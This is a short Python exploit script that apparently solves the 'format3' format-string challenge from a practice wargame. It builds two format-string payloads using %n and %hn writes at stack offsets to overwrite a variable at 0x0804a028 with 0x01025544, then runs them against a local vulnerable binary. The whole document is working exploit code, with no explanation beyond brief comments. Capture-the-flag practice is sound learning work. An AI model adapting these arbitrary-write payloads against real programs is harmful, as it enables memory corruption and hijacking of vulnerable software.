#!/bin/python3
#objdump -t i686/format3
from utils import run_command
from binascii import unhexlify

#target ds:0804a028
#target must be set to 0x01025544
# 44550201

target_addr = unhexlify('28a00408')
target_addr2 = unhexlify('29a00408')
target_addr3 = unhexlify('2aa00408')
target_addr4 = unhexlify('2ba00408')
cmd = './i686/format3'

#One byte write solution
input1 = target_addr + target_addr2 + target_addr3 + target_addr4 + b'%52x%12$n%17x%13$n%173x%14$n%255x%15$n'
run_command(cmd, input1)

input2 = target_addr3 + target_addr + b'%250u%12$hn%21570u%13$hn'
run_command(cmd, input2)